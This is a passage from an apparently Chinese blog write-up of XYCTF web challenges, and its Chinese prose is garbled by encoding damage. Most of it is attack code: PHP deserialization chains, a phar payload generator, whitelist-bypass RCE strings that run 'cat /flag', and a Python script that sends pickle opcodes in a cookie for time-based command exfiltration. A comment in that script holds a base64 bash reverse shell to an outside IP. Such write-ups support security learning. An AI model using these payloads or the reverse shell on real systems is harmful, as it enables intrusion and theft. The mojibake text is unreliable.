class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;password = &amp;<span class="variable">$nacl</span>-&gt;token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;luo = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lao = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span> = <span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span> = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;adwa = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&#x27;oSthing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd_char</span>) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;foreach&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>$0ä¸ºå½“å‰è¿è¡Œçš„è„šæœ¬(å³bash), ç„¶åç”¨å…«è¿›åˆ¶asciiä¼ å…¥cat &#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\040\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure><h2 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h2><p>ç®€å•çš„pharååºåˆ—åŒ–, ç”Ÿæˆçš„pharæ–‡ä»¶ç”¨gzipå‹ç¼©ç»•è¿‡é¢˜ç›®çš„waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&#x27;print_r(file_get_contents(array_rand(array_flip(scandir(end(array_reverse(str_split(getcwd()))))))));__halt_compiler();__halt_compiler();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=phar:///tmp/364be8860e8d72b4358b5e88099a935a.png/flag.txt</span><br></pre></td></tr></table></figure><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><p>è¿™ç§å°±åªèƒ½è€ƒè™‘åŸç”Ÿç±»è¯»æ–‡ä»¶äº†, æˆ‘æ‰¾åˆ°äº†SimpleXMLElementè¿™ä¸ªç±»,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SimpleXMLElement&amp;aa=&lt;element&gt;system&lt;/element&gt;&amp;c=__toString&amp;b=SimpleXMLElement&amp;bb=&lt;element&gt;cat /flag&lt;/element&gt;</span><br></pre></td></tr></table></figure><p>çœ‹å…¶ä»–å¸ˆå‚…çš„wp, ä¹Ÿå¯ä»¥ä½¿ç”¨Error</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=Error&amp;b=Error&amp;aa=system&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>å¾ˆæŠ½è±¡, ç”¨bashæ—¶é—´ç›²æ³¨æšä¸¾flag</p><p>è´´å‡ºæˆ‘çš„ç­”è¾©è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost:49689/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [ &quot;$(head -n 1 /flag | cut -c 1)&quot; = &quot;q&quot; ] &amp;&amp; sleep 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=if [ `cat /flag | cut -c 1` = &#x27;q&#x27; ];then sleep 5;fi&quot;</span></span><br><span class="line"></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf27</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf2fc2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lists = &#x27;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;RememberMe=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;if [ `cat /flag | cut -c &#123;&#125;` = &quot;&#123;&#125;&quot; ];then sleep 30;fi&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">lenth = <span class="built_in">len</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(lenth + <span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> k &gt; <span class="built_in">len</span>(alphabet):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;alphabet too small!!!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line"></span><br><span class="line">        op = opcode.<span class="built_in">format</span>(i, alphabet[k])</span><br><span class="line"></span><br><span class="line">        payload = base64.b64encode(op.encode())</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;RememberMe=&#x27;</span> + payload.decode()</span><br><span class="line">        <span class="built_in">print</span>(opcode.<span class="built_in">format</span>(i,alphabet[k]))</span><br><span class="line">        res = requests.get(url=url, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;waf&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;waf!!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> time.time() - time1 &gt; <span class="number">30</span>:</span><br><span class="line">            flag = flag + alphabet[k]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k = k + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="ÎµZ-Â¿Ğ¼-KÎµÂ¿-èµ›å"><a href="#ÎµZ-Â¿Ğ¼-KÎµÂ¿-èµ›å" class="headerlink" title="ÎµZ?Â¿Ğ¼@KÎµÂ¿?(èµ›å)"></a>ÎµZ?Â¿Ğ¼@KÎµÂ¿?(èµ›å)</h2><p>ç¬¬ä¸€ååº”æ˜¯æ„é€ ä¸€ä¸ªæ–‡ä»¶å†™å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;$@&lt;$&lt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥åˆ›å»ºä¸€ä¸ªFLAGæ–‡ä»¶åœ¨å½“å‰ç›®å½•, ä½†å¹¶ä¸èƒ½å¦‚æˆ‘æ‰€æ„¿æŠŠ&#x2F;flagé‡Œçš„å†…å®¹é‡å®šå‘è¿›å»</p><p>çœ‹äº†wp, è¿™é‡ŒæŠŠ&#x2F;flagä¼ ç»™bash, bashè¯»å–å†…å®¹, å°è¯•æŠŠå†…å®¹å½“æˆå‘½ä»¤æ‰§è¡Œ, ä½†æ˜¯è¿™ä¸ªå‘½ä»¤æ˜¯ä¸å­˜åœ¨çš„, æ˜¾ç¤ºæŠ¥é”™, æŠŠflagå¸¦å‡ºæ¥, è¿™ä¸ä¹‹å‰è§è¿‡çš„nmap oGå‚æ•°å†™shellæœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™, å¯æƒœå½“æ—¶æ²¡æƒ³åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$(&lt;$&lt;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240427133820719.png" alt="image-20240427133820719"></p><h2 id="è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹-èµ›å"><a href="#è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹-èµ›å" class="headerlink" title="è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹(èµ›å)"></a>è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹(èµ›å)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span 